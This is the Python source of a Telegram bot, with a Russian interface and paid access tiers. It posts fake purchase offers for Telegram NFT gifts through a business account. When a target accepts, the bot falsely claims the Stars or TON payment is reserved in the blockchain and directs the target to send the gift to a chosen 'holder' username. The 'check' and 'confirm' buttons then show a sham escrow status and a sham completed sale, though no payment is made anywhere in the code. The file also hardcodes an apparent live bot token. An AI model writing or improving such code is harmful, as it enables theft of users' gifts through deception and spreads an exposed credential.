"""
Sulumi Team Bot — Full Anti-Freeze Architecture + Stateful Check Button
"""

import os, re, uuid, time, sqlite3, requests, threading, logging
from flask import Flask, request, jsonify

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "9087583806:AAE1nylRFVLF54ppc6EQZJyDE8vQwhN6bYY")
OWNER_ID = int(os.environ.get("OWNER_ID", "9207314182"))
PAYMENT = os.environ.get("PAYMENT", "pantera138382")
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://offera-5uqe.onrender.com")
DB_PATH = os.environ.get("DATABASE_PATH", "sulumi_bot.db")

print(f"=== BOT STARTING ===")

E = {
    "stars": "5958376256788502078", "grams": "6006074913742396956",
    "decline": "5778527486270770928", "accept": "5776375003280838798",
    "forward": "5832251986635920010", "check": "6019523512908124649"
}

def ce(name, fb): return f'<tg-emoji emoji-id="{E[name]}">{fb}</tg-emoji>'
def btn(t, d, e): return {"text": t, "callback_data": d, "icon_custom_emoji_id": E[e]}
def btn_url(t, u, e): return {"text": t, "url": u, "icon_custom_emoji_id": E[e]}

# --- DATABASE LAYER ---
def get_db():
    conn = sqlite3.connect(DB_PATH, timeout=10.0)
    conn.execute("PRAGMA journal_mode=WAL;") # Предотвращает блокировки SQLite
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    c.execute('CREATE TABLE IF NOT EXISTS subscribers (user_id INTEGER PRIMARY KEY, expires_at REAL)')
    c.execute('INSERT OR IGNORE INTO subscribers (user_id, expires_at) VALUES (?, ?)', (OWNER_ID, -1.0))
    conn.commit()
    conn.close()

def is_allowed(uid):
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT expires_at FROM subscribers WHERE user_id = ?', (uid,))
        row = c.fetchone()
        conn.close()
        return row and (row[0] == -1.0 or row[0] > time.time())
    except: return False

def add_subscription(uid, days):
    conn = get_db()
    c = conn.cursor()
    exp = -1.0 if days == -1 else time.time() + (days * 86400)
    c.execute('INSERT OR REPLACE INTO subscribers (user_id, expires_at) VALUES (?, ?)', (uid, exp))
    conn.commit()
    conn.close()

def remove_subscription(uid):
    conn = get_db()
    c = conn.cursor()
    c.execute('DELETE FROM subscribers WHERE user_id = ?', (uid,))
    conn.commit()
    conn.close()

def get_expires_str(uid):
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT expires_at FROM subscribers WHERE user_id = ?', (uid,))
        row = c.fetchone()
        conn.close()
        return "Навсегда" if not row or row[0] == -1.0 else time.strftime("%d.%m.%Y", time.localtime(row[0]))
    except: return "Неизвестно"

init_db()

deals, users, bconns = {}, {}, {}
wholder, wlang, wcur = set(), set(), set()

# --- TELEGRAM API LAYER (ANTI-FREEZE) ---
def api(method, **p):
    try:
        r = requests.post(f"{API}/{method}", json=p, timeout=60)
        res = r.json()
        
        # Обработка Rate Limit (429). Критично для бизнес-аккаунтов.
        if not res.get("ok") and res.get("error_code") == 429:
            retry_after = res.get("parameters", {}).get("retry_after", 2)
            logging.warning(f"Rate limit hit. Sleeping for {retry_after}s")
            time.sleep(retry_after)
            r = requests.post(f"{API}/{method}", json=p, timeout=60)
            return r.json()
            
        return res
    except Exception as e:
        logging.error(f"API ERR: {e}")
        return {}

def fmt(n): return f"{int(n):,}".replace(",", " ")

def gs(uid):
    if uid not in users: users[uid] = {"lang": "ru", "cur": "stars", "hold": PAYMENT}
    return users[uid]

def sm(cid, txt, kb=None, bci=None):
    d = {"chat_id": cid, "text": txt, "parse_mode": "HTML"}
    if kb: d["reply_markup"] = kb
    if bci: d["business_connection_id"] = bci
    return api("sendMessage", **d)

def sm_nft(cid, txt, url, kb=None, bci=None):
    d = {"chat_id": cid, "text": txt, "parse_mode": "HTML", "link_preview_options": {"is_disabled": False, "show_above_text": True, "url": url}}
    if kb: d["reply_markup"] = kb
    if bci: d["business_connection_id"] = bci
    return api("sendMessage", **d)

def dm(cid, mid, bci=None):
    d = {"chat_id": cid, "message_id": mid}
    if bci: d["business_connection_id"] = bci
    return api("deleteMessage", **d)

def em(cid, mid, txt, kb=None, bci=None):
    d = {"chat_id": cid, "message_id": mid, "text": txt, "parse_mode": "HTML"}
    if kb: d["reply_markup"] = kb
    if bci: d["business_connection_id"] = bci
    return api("editMessageText", **d)

def ac(cb, t=None, sa=False):
    d = {"callback_query_id": cb, "show_alert": sa}
    if t: d["text"] = t
    return api("answerCallbackQuery", **d)

def okb(did):
    return {"inline_keyboard": [[btn(" Отклонить", f"decline:{did}", "decline"), btn(" Принять", f"accept:{did}", "accept")]]}

def aakb(did, h):
    return {"inline_keyboard": [
        [btn_url(" Передать", f"tg://send_gift?to={h.replace('@','')}", "forward")], 
        [btn(" Проверить", f"check:{did}", "check")]
    ]}

def confirm_kb(did):
    return {"inline_keyboard": [[btn("✅ Подтвердить получение", f"confirm:{did}", "accept")]]}

def pnft(t):
    m = re.search(r'(?:https?://)?(?:t\.me/nft/)?([A-Za-z0-9]+-\d+)', t, re.I)
    if not m: return None
    s = m.group(1)
    np2, num = s.rsplit("-", 1)
    return {"slug": s, "name": re.sub(r'([a-z])([A-Z])', r'\1 \2', np2), "num": num, "nfmt": fmt(num)}

# --- LOGIC LAYER ---
def process_msg(msg):
    try:
        cid = msg["chat"]["id"]
        uid = msg["from"]["id"]
        mid = msg["message_id"]
        ci = msg.get("business_connection_id")
        txt = (msg.get("text") or "").strip()
        
        if not cid or not uid or not txt: return
        if ci: bconns[uid] = ci
        
        if uid in wholder:
            un = txt.lstrip("@").lower()
            if un and " " not in un:
                gs(uid)["hold"] = un
                wholder.discard(uid)
                sm(cid, f"✅ Держатель: @{un}", bci=ci)
            return
        
        if uid in wlang:
            if txt.lower() in ["ru", "en"]:
                gs(uid)["lang"] = txt.lower()
                wlang.discard(uid)
                sm(cid, f"✅ Язык: {'🇷🇺 RU' if txt.lower()=='ru' else '🇬🇧 EN'}", bci=ci)
            return
        
        if uid in wcur:
            if txt.lower() in ["stars", "grams"]:
                gs(uid)["cur"] = txt.lower()
                wcur.discard(uid)
                sm(cid, f"✅ Валюта: {'⭐' if txt.lower()=='stars' else '💎'}", bci=ci)
            return
        
        # ТРИГГЕР SHD
        if txt.lower().startswith("shd "):
            parts = txt.split()
            if len(parts) < 3:
                err = sm(cid, "❌ Формат: shd ссылка цена", bci=ci)
                time.sleep(1.5)
                if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
                dm(cid, mid, bci=ci) if ci else dm(cid, mid)
                return
            
            rest = " ".join(parts[1:])
            ni = pnft(rest)
            if not ni:
                err = sm(cid, "❌ Не найдена NFT", bci=ci)
                time.sleep(1.5)
                if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
                dm(cid, mid, bci=ci) if ci else dm(cid, mid)
                return
            
            try: pr = int(parts[-1])
            except:
                err = sm(cid, "❌ Цена должна быть числом", bci=ci)
                time.sleep(1.5)
                if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
                dm(cid, mid, bci=ci) if ci else dm(cid, mid)
                return
            
            if uid != OWNER_ID and not is_allowed(uid):
                err = sm(cid, f"🔒 Доступ закрыт. @{PAYMENT}", bci=ci)
                time.sleep(1.5)
                if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
                dm(cid, mid, bci=ci) if ci else dm(cid, mid)
                return
            
            s = gs(uid)
            cs = ce("stars", "⭐") if s["cur"] == "stars" else ce("grams", "💎")
            did = str(uuid.uuid4())[:8]
            sender_bci = ci or bconns.get(uid)
            
            if not sender_bci:
                err = sm(cid, "⚠️ Подключи бизнес-аккаунт!", bci=ci)
                time.sleep(1.5)
                if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
                dm(cid, mid, bci=ci) if ci else dm(cid, mid)
                return
            
            deals[did] = {"wid": uid, "lid": cid, "slug": ni["slug"], "name": ni["name"], "num": ni["num"], "price": pr, "cur": s["cur"], "hold": s["hold"], "st": "pending", "bci": sender_bci}
            
            nl = f"https://t.me/nft/{ni['slug']}"
            hidden = f'<a href="{nl}">\u200b</a>'
            name = msg['from'].get('first_name') or msg['from'].get('username') or "User"
            cap = hidden + f"<b>{name}</b> предлагает <b>{pr}</b> {cs} за <b>{ni['name']} #{ni['nfmt']}</b>.\n\n5h 59m на решение."
            
            res = sm_nft(cid, cap, nl, kb=okb(did), bci=sender_bci)
            
            if res.get("ok"):
                time.sleep(1.5) 
                # ИСПРАВЛЕНИЕ УДАЛЕНИЯ:
                if ci:
                    dm(cid, mid, bci=ci)
                else:
                    dm(cid, mid)
            return
        
        # ===== КОМАНДЫ =====
        if txt.startswith("/"):
            if txt == "/buy":
                sm(cid, f"💎 Напишите @{PAYMENT} для покупки", bci=ci)
            elif txt == "/tarifs":
                sm(cid, "💎 1 День — 1 TON\n3 Дни — 2.5 TON\nНавсегда — 4.5 TON", bci=ci)
            elif txt == "/lg":
                wlang.add(uid)
                sm(cid, "🌐 ru или en", bci=ci)
            elif txt == "/cv":
                wcur.add(uid)
                sm(cid, "💱 stars или grams", bci=ci)
            elif txt.startswith("/holder"):
                wholder.add(uid)
                sm(cid, "👑 Username без @", bci=ci)
            elif uid == OWNER_ID:
                if txt.startswith("/legitt"):
                    parts = txt.split()
                    if len(parts) < 4 or parts[1] != "add":
                        sm(cid, "❌ Формат: <code>/legitt add id1 id2 id3 дни</code>\n(-1 = навсегда)", bci=ci)
                        return
                    try:
                        days = int(parts[-1])
                        ids = [int(x) for x in parts[2:-1]]
                        added = []
                        for tid in ids:
                            add_subscription(tid, days)
                            added.append(str(tid))
                        exp_str = "Навсегда" if days == -1 else f"{days} дн."
                        sm(cid, f"✅ Доступ выдан {len(added)} пользователям:\n<code>{', '.join(added)}</code>\nСрок: {exp_str}", bci=ci)
                    except Exception as e:
                        sm(cid, f"❌ Ошибка: {e}", bci=ci)
                elif txt.startswith("/zabrat"):
                    parts = txt.split()
                    if len(parts) < 2:
                        sm(cid, "❌ Формат: <code>/zabrat id</code>", bci=ci)
                        return
                    try:
                        target_uid = int(parts[1])
                        remove_subscription(target_uid)
                        sm(cid, f"✅ Доступ отозван у <code>{target_uid}</code>", bci=ci)
                    except Exception as e:
                        sm(cid, f"❌ Ошибка: {e}", bci=ci)
                elif txt == "/list":
                    conn = get_db()
                    rows = conn.execute('SELECT user_id, expires_at FROM subscribers').fetchall()
                    conn.close()
                    if not rows:
                        sm(cid, "📋 Список пуст", bci=ci)
                        return
                    ul = "\n".join([f"• <code>{r[0]}</code> — {get_expires_str(r[0])}" for r in rows])
                    sm(cid, f"📋 Доступы ({len(rows)}):\n\n{ul}", bci=ci)
            else:
                sm(cid, "🔒 Только для админа", bci=ci)

    except Exception as e:
        logging.error(f"MSG ERR: {e}")

def process_cb(cb):
    try:
        cbid = cb["id"]
        uid = cb["from"]["id"]
        msg = cb.get("message") or {}
        cid = msg.get("chat", {}).get("id", uid)
        mid = msg.get("message_id", 0)
        data = cb.get("data", "")
        ci = msg.get("business_connection_id")
        
        # КНОПКА ПРОВЕРИТЬ
        if data.startswith("check:"):
            did = data.split(":")[1]
            deal = deals.get(did)
            if not deal:
                ac(cbid, txt="❌ Оффер не найден", sa=True)
                return
            
            if deal["st"] == "checking":
                ac(cbid, txt="⏳ Уже проверяется", sa=True)
                return

            deal["st"] = "checking"
            ac(cbid)
            
            nf = fmt(deal["num"])
            cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
            h = deal["hold"]
            nl = f"https://t.me/nft/{deal['slug']}"
            bci = deal.get("bci") or ci
            
            hidden = f'<a href="{nl}">\u200b</a>'
            txt = hidden + f"🔄 <b>Статус: Проверяется передача</b>\n\n"
            txt += f"Ожидается NFT <b>{deal['name']} #{nf}</b> от @{h}.\n"
            txt += f"После получения NFT, {deal['price']} {cs} будут разморожены."
            
            em(cid, mid, txt, kb=confirm_kb(did), bci=bci)
            return

        # КНОПКА ПОДТВЕРДИТЬ ПОЛУЧЕНИЕ
        if data.startswith("confirm:"):
            did = data.split(":")[1]
            deal = deals.get(did)
            if not deal or deal["st"] != "checking": 
                ac(cbid, txt="Сделка не активна", sa=True)
                return
                
            deal["st"] = "completed"
            ac(cbid)
            
            nf = fmt(deal["num"])
            cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
            h = deal["hold"]
            nl = f"https://t.me/nft/{deal['slug']}"
            bci = deal.get("bci") or ci
            
            hidden = f'<a href="{nl}">\u200b</a>'
            txt = hidden + f"✅ <b>Сделка успешно завершена!</b>\n\n"
            txt += f"NFT <b>{deal['name']} #{nf}</b> получен.\n"
            txt += f"{deal['price']} {cs} отправлены продавцу."
            
            em(cid, mid, txt, kb=None, bci=bci)
            return
        
        ac(cbid)
        
        if data.startswith("accept:"):
            did = data.split(":")[1]
            deal = deals.get(did)
            if not deal or deal["st"] != "pending": return
            deal["st"] = "accepted"
            cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
            nf = fmt(deal["num"])
            h = deal["hold"]
            nl = f"https://t.me/nft/{deal['slug']}"
            bci = deal.get("bci") or ci
            
            hidden = f'<a href="{nl}">\u200b</a>'
            txt = hidden + f"<b>{deal['price']}</b> {cs} успешно зарезервированы в блокчейне.\n\n"
            txt += f"Ожидается передача подарка <b>{deal['name']} #{nf}</b> пользователю @{h}.\n\n"
            txt += f"Нажмите кнопку «Передать» и отправьте подарок <b>{deal['name']} #{nf}</b> пользователю <b>@{h}</b>. После завершения сделки {cs} автоматически начислятся на ваш аккаунт."
            
            res = api("editMessageText", chat_id=cid, message_id=mid, text=txt, parse_mode="HTML", link_preview_options={"is_disabled": False, "show_above_text": True, "url": nl}, reply_markup=aakb(did, h), business_connection_id=bci)
            if not res.get("ok"):
                dm(cid, mid, bci=bci)
                sm_nft(cid, txt, nl, kb=aakb(did, h), bci=bci)
            return
        
        if data.startswith("decline:"):
            did = data.split(":")[1]
            deal = deals.get(did)
            bci = deal.get("bci") or ci if deal else ci
            if deal: deal["st"] = "declined"
            em(cid, mid, "❌ Оффер отклонён.", bci=bci)
            return
    except Exception as e:
        logging.error(f"CB ERR: {e}")

# --- WEBHOOK ROUTE (NON-BLOCKING) ---
def process_update(u):
    try:
        if "message" in u: process_msg(u["message"])
        elif "business_message" in u: process_msg(u["business_message"])
        elif "callback_query" in u: process_cb(u["callback_query"])
        elif "business_connection" in u: bconns[u["business_connection"]["user"]["id"]] = u["business_connection"]["id"]
    except Exception as e:
        logging.error(f"UPDATE ERR: {e}")

@app.route("/webhook", methods=["POST"])
def webhook():
    u = request.get_json(silent=True)
    if u:
        # Запускаем обработку в фоне. Это спасает от таймаутов Render и ретраев Telegram.
        threading.Thread(target=process_update, args=(u,)).start()
    return jsonify({"ok": True}), 200

@app.route("/")
def index(): return "✅ OK"

def set_wh():
    r = api("setWebhook", url=f"{RENDER_URL}/webhook", allowed_updates=["message", "callback_query", "business_connection", "business_message"])
    logging.info(f"Webhook set: {r}")

def set_cmd():
    api("setMyCommands", commands=[
        {"command": "buy", "description": "💎 Купить"}, {"command": "tarifs", "description": "💳 Цены"},
        {"command": "lg", "description": "🌐 Язык"}, {"command": "cv", "description": "💱 Валюта"},
        {"command": "holder", "description": "👑 Держатель"}, {"command": "list", "description": "📋 Список (админ)"},
        {"command": "zabrat", "description": "🚫 Отозвать (админ)"}, {"command": "legitt", "description": "➕ Выдать (админ)"}
    ])

if __name__ == "__main__":
    set_wh()
    set_cmd()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
